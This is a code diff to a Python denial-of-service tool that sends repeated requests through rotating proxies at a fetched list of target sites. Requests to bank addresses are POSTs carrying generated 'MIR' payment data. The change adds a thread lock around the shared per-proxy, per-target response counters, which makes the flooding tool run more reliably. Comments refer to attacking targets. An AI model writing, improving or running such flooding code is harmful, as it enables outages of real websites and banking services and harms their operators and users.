@@ -12,7 +12,7 @@ from loguru import logger
 import time
 import sys
 from sys import stderr
-from threading import Thread
+from threading import Thread, Lock
 from random import choice
 from random import randint
 from random import random
@@ -63,7 +63,7 @@ def generate_MIR_data(url):
     return dat
 
 
-def mainth(protocol, ip, proxy_name, region):
+def mainth(protocol, ip, proxy_name, region, lock):
     # Fetching data with proxy and targets
     sites = get_sites()
 
@@ -78,7 +78,9 @@ def mainth(protocol, ip, proxy_name, region):
             sites = get_sites()
             proxies = get_proxies()
             (protocol, ip, proxy_name, region) = choice(proxies)
+            lock.acquire()
             counter_by_sites[proxy_name] = {}
+            lock.release()
         scraper = base_scraper()
         # logger.info("GET RESOURCES FOR ATTACK")
         # data = choice(sites)
@@ -100,8 +102,10 @@ def mainth(protocol, ip, proxy_name, region):
             sites.pop(index_)
             continue
 
+        lock.acquire()
         if current_target not in counter_by_sites[proxy_name]:
             counter_by_sites[proxy_name][current_target] = {}
+        lock.release()
 
         cur_proxy = ip
         scraper.proxies.update({'http': cur_proxy,
@@ -111,20 +115,16 @@ def mainth(protocol, ip, proxy_name, region):
         for _ in range(MAX_REQUESTS):
             response = {}
             try:
-                # logger.info(json.dumps(counter_by_sites))
                 if current_target in BANK_IPS:
                     response = scraper.post(current_target,
                                             generate_MIR_data(current_target))
                 else:
                     response = scraper.get(current_target)
-                # logger.info("ATTACKED; RESPONSE CODE: " +
-                #             str(response.status_code) + " (" +
-                #             (str(counter403[current_target]) if current_target in counter403 else '0') +
-                #             ") TARGET: " + current_target + " PROXY: " + proxy_name +
-                #             " | " + region)
+                lock.acquire()
                 if response.status_code not in counter_by_sites[proxy_name][current_target]:
                     counter_by_sites[proxy_name][current_target][response.status_code] = 0
                 counter_by_sites[proxy_name][current_target][response.status_code] += 1
+                lock.release()
 
                 if response.status_code == 404 or ((current_target in counter403) and (counter403[current_target] >= 30)):
                     sites.pop(index_)
@@ -139,9 +139,11 @@ def mainth(protocol, ip, proxy_name, region):
 
             except Exception as err:
                 # logger.warning("GOT ISSUE WHILE ATTACKING " + current_target)
+                lock.acquire()
                 if 'exceptions' not in counter_by_sites[proxy_name][current_target]:
                     counter_by_sites[proxy_name][current_target]['exceptions'] = 0
                 counter_by_sites[proxy_name][current_target]['exceptions'] += 1
+                lock.release()
                 sites.pop(index_)
                 break
 
@@ -179,10 +181,12 @@ def get_proxies():
 #     time.sleep(3)
 
 
-def stat_visualiser():
+def stat_visualiser(lock):
     while True:
         # {extra[proxy]} {extra[target]} {extra[err_code]} {extra[err_count]}
+        lock.acquire()
         logger.info(json.dumps(counter_by_sites, indent=4, sort_keys=True))
+        lock.release()
         # for proxy, targets in counter_by_sites.items():
         #     logger.info(proxy + ":", enqueue=True)
         #     for target, counters in targets.items():
@@ -195,9 +199,12 @@ def stat_visualiser():
 
 
 if __name__ == '__main__':
+    lock = Lock()
     proxies = get_proxies()
     for _ in range(threads):
-        Thread(target=mainth, args=choice(proxies)).start()
+        args_ = choice(proxies)
+        args_.append(lock)
+        Thread(target=mainth, args=args_).start()
 
     Thread(target=cleaner, daemon=True).start()
-    Thread(target=stat_visualiser).start()
+    Thread(target=stat_visualiser, args=(lock, )).start()
